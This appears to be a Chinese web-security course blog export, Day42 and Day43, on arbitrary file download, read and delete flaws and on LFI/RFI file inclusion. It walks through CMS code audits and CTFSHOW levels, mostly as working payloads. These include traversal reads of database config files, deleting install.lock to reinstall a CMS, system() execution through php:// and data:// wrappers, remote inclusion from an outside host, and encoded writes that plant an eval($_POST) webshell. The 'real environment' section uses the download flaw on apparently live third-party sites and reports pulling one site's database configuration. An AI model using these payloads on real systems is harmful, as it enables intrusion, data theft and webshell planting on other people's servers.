      <link href="/2023/01/31/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/"/>
      <url>/2023/01/31/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、文件操作类安全问题</p><p>2、文件下载&amp;删除&amp;读取</p><p>3、白盒&amp;黑盒&amp;探针分析</p><h3 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h3><p>文件读取：基本和文件下载利用类似</p><p>文件下载：利用下载获取源码或数据库配置文件及系统敏感文件为后续出思路</p><p>文件删除：除自身安全引发的文件删除外，可配合删除重装锁定文件进行重装</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ 审计分析-文件下载-XHCMS-功能点</p><p>➢ 审计分析-文件读取-MetInfo-函数搜索</p><p>➢ 审计分析-文件删除-74CMS-函数搜索</p><p>➢ 黑盒分析-下载读取-下载资源URL参数</p><h4 id="白盒审计："><a href="#白盒审计：" class="headerlink" title="#白盒审计："></a>#白盒审计：</h4><h5 id="1、文件下载"><a href="#1、文件下载" class="headerlink" title="1、文件下载"></a>1、文件下载</h5><p>流程-功能点抓包-寻代码文件-寻变量控制-构造测试</p><p>Payload: softadd&#x3D;d:&#x2F;1.txt softadd2&#x3D;d:&#x2F;1.txt</p><h5 id="2、文件删除：74CMS-配合删除重装"><a href="#2、文件删除：74CMS-配合删除重装" class="headerlink" title="2、文件删除：74CMS-配合删除重装"></a>2、文件删除：74CMS-配合删除重装</h5><p>流程-特定函数搜索-寻触发调用-构造Payload测试</p><p>Payload: &#x2F;admin&#x2F;admin_article.php?act&#x3D;del_img&amp;img&#x3D;..&#x2F;..&#x2F;data&#x2F;install.lock</p><h5 id="3、文件读取：MetInfo-任意读取"><a href="#3、文件读取：MetInfo-任意读取" class="headerlink" title="3、文件读取：MetInfo-任意读取"></a>3、文件读取：MetInfo-任意读取</h5><p>流程-特定函数搜索-寻触发调用-构造Payload测试</p><p>Payload：&#x2F;include&#x2F;thumb.php?dir&#x3D;http....\config\config_db.php</p><h4 id="黑盒探针"><a href="#黑盒探针" class="headerlink" title="#黑盒探针"></a>#黑盒探针</h4><h5 id="1、URL参数名及参数值分析："><a href="#1、URL参数名及参数值分析：" class="headerlink" title="1、URL参数名及参数值分析："></a>1、URL参数名及参数值分析：</h5><p>参数名：英文对应翻译</p><p>参数值：目录或文件名</p><h5 id="2、功能点自行修改后分析："><a href="#2、功能点自行修改后分析：" class="headerlink" title="2、功能点自行修改后分析："></a>2、功能点自行修改后分析：</h5><p>文件下载，删除，读取等</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h5 id="➢-审计分析-文件下载-XHCMS-功能点"><a href="#➢-审计分析-文件下载-XHCMS-功能点" class="headerlink" title="➢ 审计分析-文件下载-XHCMS-功能点"></a>➢ 审计分析-文件下载-XHCMS-功能点</h5><p>判断下载文件能不能控制</p><p>数据库查询过来-&gt;$down[‘softadd’];-&gt;$fileadd-&gt;$sourceFile下载文件变量</p><h5 id="➢-审计分析-文件读取-MetInfo-函数搜索"><a href="#➢-审计分析-文件读取-MetInfo-函数搜索" class="headerlink" title="➢ 审计分析-文件读取-MetInfo-函数搜索"></a>➢ 审计分析-文件读取-MetInfo-函数搜索</h5><p>流程-特定函数搜索-寻触发调用-构造Payload测试</p><p>搜索一些文件读取的函数：cnblogs.com&#x2F;gyrgyr&#x2F;p&#x2F;5774436.html</p><p>1.fread  2.fgets  3.fgetss   4.file   5.readfile   6.file_get_contents   7.fpassthru</p><p>通过查找函数readfile找到这个路径下的readfile</p><p>靶场：Metlnfo6.0.0</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201150457805.png" alt="image-20230201150457805"></p><p>找到控制读取文件的变量$dir</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201150628834.png" alt="image-20230201150628834"></p><p>查找$dir从哪里来，全局搜索$dir</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201150944356.png" alt="image-20230201150944356"></p><p>然后看谁调用了这个文件的对象class old_thumb全局搜索</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201151034843.png" alt="image-20230201151034843"></p><p>找到位置：</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201151102971.png" alt="image-20230201151102971"></p><p>访问Payload：&#x2F;include&#x2F;thumb.php?dir&#x3D;http....\config\config_db.php读取到数据库配置文件</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201151735482.png" alt="image-20230201151735482"></p><p>访问要加http&#x2F;是因为代码中的需求：</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201154936491.png" alt="image-20230201154936491"></p><h5 id="➢-审计分析-文件删除-74CMS-函数搜索"><a href="#➢-审计分析-文件删除-74CMS-函数搜索" class="headerlink" title="➢ 审计分析-文件删除-74CMS-函数搜索"></a>➢ 审计分析-文件删除-74CMS-函数搜索</h5><p>靶场：74cms3.4</p><p>全局搜索php文件删除函数unlink</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201161448482.png" alt="image-20230201161448482"></p><p>进入admin_article.php发现只有act&#x3D;del_img时才会触发删除，这里的$upfiles，$thumb_dir和$img都没有写死，可以控制</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201161625063.png" alt="image-20230201161625063"></p><p>追踪$thumb_dir发现其是固定目录的变量，确定它是删除在data下的再下一级(变量updor_thumb)的文件(两个目录)</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201163035375.png" alt="image-20230201163035375"></p><p>所以如果想删除根目录下的1.txt，则构造payload: &#x2F;admin&#x2F;admin_article.php?act&#x3D;del_img&amp;img&#x3D;..&#x2F;..&#x2F;1.txt(从变量updor_thumb的目录跳到data，再data往上到根目录)</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201162809665.png" alt="image-20230201162809665"></p><p>删除成功！</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201163612582.png" alt="image-20230201163612582"></p><p>若要删除安装文件data下的install.lock </p><p>Payload: &#x2F;admin&#x2F;admin_article.php?act&#x3D;del_img&amp;img&#x3D;..&#x2F;..&#x2F;data&#x2F;install.lock</p><p>Payload: &#x2F;admin&#x2F;admin_article.php?act&#x3D;del_img&amp;img&#x3D;..&#x2F;install.lock也可以，因为一个..&#x2F;就返回到了data目录下，..&#x2F;..&#x2F;data&#x2F;install.lock只是第二个..&#x2F;从data返回到根目录，后面接&#x2F;data是又回到data目录下</p><h5 id="➢-黑盒分析-下载读取-下载资源URL参数（真实环境）"><a href="#➢-黑盒分析-下载读取-下载资源URL参数（真实环境）" class="headerlink" title="➢ 黑盒分析-下载读取-下载资源URL参数（真实环境）"></a>➢ 黑盒分析-下载读取-下载资源URL参数（真实环境）</h5><blockquote><p>下载文件URL</p><p>没有安全问题：</p><p><a href="http://www.xiaodi8.com/soft/2.zip">www.xiaodi8.com/soft/2.zip</a> 直连下载</p><p><a href="http://www.xiaodi8.com/soft/index.php">www.xiaodi8.com/soft/index.php</a></p><p>可能安全问题</p><p><a href="http://www.xiaodi8.com/down?file=1.zip">www.xiaodi8.com/down?file=1.zip</a></p><p>代码用下载协议去解析文件</p><p><a href="http://www.xiaodi8.com/down?file=index.php">www.xiaodi8.com/down?file=index.php</a></p></blockquote><p>1、网站：<a href="http://67.202.70.133/files/readfile.php?file=">http://67.202.70.133/files/readfile.php?file=</a></p><p>访问：<a href="http://67.202.70.133/files/readfile.php?file=index.php%E6%84%8F%E6%80%9D%E6%98%AF%E4%B8%8B%E8%BD%BDfiles%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84index.php%E6%B2%A1%E6%9C%89%E8%BF%99%E4%B8%AA%E6%96%87%E4%BB%B6%EF%BC%8C%E9%A6%96%E9%A1%B5%E6%96%87%E4%BB%B6%E5%9C%A8%E6%A0%B9%E7%9B%AE%E5%BD%95%E4%B8%8B%E5%92%8Cfiles%E5%90%8C%E7%BA%A7%EF%BC%8C%E6%89%80%E4%BB%A5%E8%A6%81%E8%AE%BF%E9%97%AE%EF%BC%9Ahttp://67.202.70.133/files/readfile.php?file=../index.php%E6%89%8D%E5%8F%AF%E4%BB%A5%E4%B8%8B%E8%BD%BD%E5%88%B0">http://67.202.70.133/files/readfile.php?file=index.php意思是下载files目录下的index.php没有这个文件，首页文件在根目录下和files同级，所以要访问：http://67.202.70.133/files/readfile.php?file=../index.php才可以下载到</a></p><p>下载后打开发现很多包含文件，都可以下载，或者直接找到这套程序的cms：Joomla，在网上查找其数据库文件的路径发现是：..&#x2F;configuration.php</p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201143505961.png" alt="image-20230201143505961"></p><p>所以访问<a href="http://67.202.70.133/files/readfile.php?file=../configuration.php%E5%B0%B1%E4%B8%8B%E8%BD%BD%E5%88%B0%E4%BA%86%E6%95%B0%E6%8D%AE%E5%BA%93%E6%96%87%E4%BB%B6">http://67.202.70.133/files/readfile.php?file=../configuration.php就下载到了数据库文件</a></p><p>2、网站：<a href="http://down.znds.com/getdownurl/?s=L2Rvd24vMjAyMzAxMDMvZGJrZ3l5XzEuOS4yX2RhbmdiZWkuYXBr">http://down.znds.com/getdownurl/?s=L2Rvd24vMjAyMzAxMDMvZGJrZ3l5XzEuOS4yX2RhbmdiZWkuYXBr</a></p><p><img src="/../images/Day43-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1/image-20230201143250340.png" alt="image-20230201143250340"></p><p>此处的&#x2F;down&#x2F;20211229是从根目录开始的，所以下载index.php直接前面加&#x2F;就可以了</p>]]></content>
      
      
      <categories>
          
          <category> Web攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day42 WEB攻防-通用漏洞&amp;文件包含&amp;LFI&amp;RFI&amp;伪协议编码算法&amp;代码审计</title>
      <link href="/2023/01/31/Day42-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI-RFI-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2023/01/31/Day42-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI-RFI-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、解释-什么是文件包含</p><p>2、分类-本地LFI&amp;远程RFI</p><p>3、利用-配合上传&amp;日志&amp;会话</p><p>4、利用-伪协议&amp;编码&amp;算法等</p><h3 id="核心知识："><a href="#核心知识：" class="headerlink" title="#核心知识："></a>#核心知识：</h3><h5 id="1、本地包含LFI-amp-远程包含RFI-区别"><a href="#1、本地包含LFI-amp-远程包含RFI-区别" class="headerlink" title="1、本地包含LFI&amp;远程包含RFI-区别"></a>1、本地包含LFI&amp;远程包含RFI-区别</h5><p>一个只能包含本地，一个可以远程加载</p><p>具体形成原因由代码和环境配置文件决定</p><h5 id="2、各类脚本语言包含代码写法-见下文"><a href="#2、各类脚本语言包含代码写法-见下文" class="headerlink" title="2、各类脚本语言包含代码写法-见下文"></a>2、各类脚本语言包含代码写法-见下文</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--#include file=&quot;1.asp&quot; --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--#include file=&quot;top.aspx&quot; --&gt;</span><br><span class="line"></span><br><span class="line">&lt;c:import url=&quot;http://thief.one/1.jsp&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;jsp:include page=&quot;head.jsp&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ include file=&quot;head.jsp&quot;%&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php Include(&#x27;test.php&#x27;)?&gt;</span><br></pre></td></tr></table></figure><h5 id="3、各类脚本语言包含伪协议玩法-见图"><a href="#3、各类脚本语言包含伪协议玩法-见图" class="headerlink" title="3、各类脚本语言包含伪协议玩法-见图"></a>3、各类脚本语言包含伪协议玩法-见图</h5><p><a href="https://www.cnblogs.com/endust/p/11804767.html">https://www.cnblogs.com/endust/p/11804767.html</a></p><h3 id="思路要点："><a href="#思路要点：" class="headerlink" title="#思路要点："></a>#思路要点：</h3><h5 id="黑盒发现："><a href="#黑盒发现：" class="headerlink" title="-黑盒发现："></a>-黑盒发现：</h5><blockquote><p>主要观察参数传递的数据和文件名是否对应</p></blockquote><h5 id="白盒发现："><a href="#白盒发现：" class="headerlink" title="-白盒发现："></a>-白盒发现：</h5><blockquote><p>1、可通过应用功能追踪代码定位审计</p><p>2、可通过脚本特定函数搜索定位审计</p><p>3、可通过伪协议玩法绕过相关修复等</p></blockquote><h3 id="本课总结："><a href="#本课总结：" class="headerlink" title="#本课总结："></a>#本课总结：</h3><p>1、有可控文件如能上传文件，配合上传后包含</p><p>2、无可控文件可以利用日志或Session&amp;伪协议</p><p>3、代码固定目录及文件后缀时需考虑版本绕过</p><p>4、伪协议玩法是建立在代码中只有变量存在时</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>​                ➢ 前置知识-原理&amp;分类&amp;探针&amp;利用&amp;修复</p><p>​                ➢ CTF应用-CTFSHOW-78关卡到117关卡</p><p>​                ➢ CMS源码-XHCMS-代码审计&amp;日志&amp;绕过</p><h5 id="前置知识-原理-amp-分类-amp-探针-amp-利用-amp-修复"><a href="#前置知识-原理-amp-分类-amp-探针-amp-利用-amp-修复" class="headerlink" title="#前置知识-原理&amp;分类&amp;探针&amp;利用&amp;修复"></a>#前置知识-原理&amp;分类&amp;探针&amp;利用&amp;修复</h5><p>实现过滤功能，是每个带代码段进行过滤编写，还是写一个过滤文件</p><p>1.每个需要过滤的地方，进行一次过滤的编写</p><p>2.每个需要过滤的地方，进行一次文件包含调用过滤函数</p><p>1.配合文件上传进行getshell，图片带有脚本后门代码，包含这个图片，脚本代码就被触发</p><p>2.配合日志文件进行getshell ，日志会记录访问UA信息，修改UA信息为后门代码，包含即执行后门代码</p><p>3.配合会话session进行getshell</p><p>文件包含</p><p>本地包含：LFI ：local file include</p><p>包含一个文件，这个文件有后门代码，就可以shell连上去</p><p>这个文件哪里来？</p><p><strong>三种思路：</strong></p><blockquote><p>1、可以通过文件上传获取，上传的文件在服务器上（上传任何后缀文件即可，因为会被include函数当作php执行）</p><p>2、没有文件上传，借助日志写入（UA），session文件写入</p><p>3、伪协议没有文件上传也能进行php代码执行，读文件，写文件（编码算法的转换）</p></blockquote><p>伪协议有条件：</p><p>（1）allow_url开关</p><p><img src="/../images/Day42-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI-RFI-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230131142920202.png" alt="image-20230131142920202"></p><p>（2）利用伪协议php如果指定了包含目录，则不能解析</p><p><img src="/../images/Day42-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI-RFI-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230131143116526.png" alt="image-20230131143116526"></p><p>要单纯的包含$file才行</p><p><img src="/../images/Day42-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI-RFI-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230131143329641.png" alt="image-20230131143329641"></p><p>否则会报错：</p><p><img src="/../images/Day42-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI-RFI-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230131143448962.png" alt="image-20230131143448962"></p><h4 id="CTF应用-CTFSHOW-78关卡到117关卡"><a href="#CTF应用-CTFSHOW-78关卡到117关卡" class="headerlink" title="#CTF应用-CTFSHOW-78关卡到117关卡"></a>#CTF应用-CTFSHOW-78关卡到117关卡</h4><h6 id="78-php-amp-http协议"><a href="#78-php-amp-http协议" class="headerlink" title="78-php&amp;http协议"></a>78-php&amp;http协议</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload: ?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line"></span><br><span class="line">payload: ?file=php:<span class="comment">//input post:&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span></span><br><span class="line"></span><br><span class="line">payload: ?file=http:<span class="comment">//www.xiaodi8.com/1.txt 1.txt:&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span></span><br></pre></td></tr></table></figure><h6 id="79-data-amp-http协议"><a href="#79-data-amp-http协议" class="headerlink" title="79-data&amp;http协议"></a>79-data&amp;http协议</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload: ?file=data:<span class="comment">//text/plain,&lt;?=system(&#x27;tac flag.*&#x27;);?&gt;</span></span><br><span class="line"></span><br><span class="line">payload: ?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</span></span><br><span class="line"></span><br><span class="line">payload: ?file=http:<span class="comment">//www.xiaodi8.com/1.txt 1.txt:&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span></span><br></pre></td></tr></table></figure><h6 id="80-81-日志包含"><a href="#80-81-日志包含" class="headerlink" title="80 81-日志包含"></a>80 81-日志包含</h6><p>1、利用其他协议,如file,zlib等</p><p>2、利用日志记录UA特性包含执行</p><p>分析需文件名及带有php关键字放弃</p><p>故利用日志记录UA信息，UA带入代码</p><p>包含：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><h6 id="82-86-SESSION包含"><a href="#82-86-SESSION包含" class="headerlink" title="82-86-SESSION包含"></a>82-86-SESSION包含</h6><p><a href="https://www.cnblogs.com/lnterpreter/p/14086164.html">https://www.cnblogs.com/lnterpreter/p/14086164.html</a></p><p><a href="https://www.cnblogs.com/echoDetected/p/13976405.html">https://www.cnblogs.com/echoDetected/p/13976405.html</a></p><h6 id="87-php-x2F-x2F-filter-x2F-write-amp-加密编码"><a href="#87-php-x2F-x2F-filter-x2F-write-amp-加密编码" class="headerlink" title="87-php:&#x2F;&#x2F;filter&#x2F;write&amp;加密编码"></a>87-php:&#x2F;&#x2F;filter&#x2F;write&amp;加密编码</h6><p>1、利用base64:</p><p>url编码2次：php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;123.php </p><p>content&#x3D;aaPD9waHAgQGV2YWwoJF9QT1NUW2FdKTs&#x2F;Pg&#x3D;&#x3D;</p><p>编码两次的原因是浏览器会自动解码一次，第二次是因为有解码函数，所以要两次编码</p><p>2、利用凯撒13：</p><p>url编码2次：php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13&#x2F;resource&#x3D;2.php</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">content=&lt;?cuc riny($_CBFG[1]);?&gt;</span><br></pre></td></tr></table></figure><h6 id="88-data-amp-base64协议"><a href="#88-data-amp-base64协议" class="headerlink" title="88-data&amp;base64协议"></a>88-data&amp;base64协议</h6><p>过滤PHP，各种符号，php代码编码写出无符号base64值</p><p>Payload：file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKi5waHAnKTtlY2hvIDEyMzs&#x2F;PmFk</p><h6 id="117-php-x2F-x2F-filter-x2F-write-amp-新的算法"><a href="#117-php-x2F-x2F-filter-x2F-write-amp-新的算法" class="headerlink" title="117-php:&#x2F;&#x2F;filter&#x2F;write&amp;新的算法"></a>117-php:&#x2F;&#x2F;filter&#x2F;write&amp;新的算法</h6><p>convert.iconv.：一种过滤器，和使用iconv()函数处理流数据有等同作用</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>, <span class="string">&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;经过一次反转:&quot;</span>.<span class="variable">$result</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;经过第二次反转:&quot;</span>.<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>, <span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">Payload：file=php:<span class="comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</span></span><br><span class="line">contents=?&lt;hp pvela$(P_SO[T]a;)&gt;?</span><br></pre></td></tr></table></figure><h5 id="CMS源码-XHCMS-代码审计-amp-日志-amp-绕过"><a href="#CMS源码-XHCMS-代码审计-amp-日志-amp-绕过" class="headerlink" title="#CMS源码-XHCMS-代码审计&amp;日志&amp;绕过"></a>#CMS源码-XHCMS-代码审计&amp;日志&amp;绕过</h5><p>1、搜索特定函数寻包含点</p><p>2、固定目录及后缀名需绕过</p><p>3、由CMS无上传用日志包含</p><p>4、利用长度绕过后缀名固定</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Payload:</span><br><span class="line">？r=../../../Apache/logs/access.log/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</span><br></pre></td></tr></table></figure><p>搜include关键词</p><p><img src="/../images/Day42-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI-RFI-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230131163709607.png" alt="image-20230131163709607"></p><p>在index文件里面找到</p><p><img 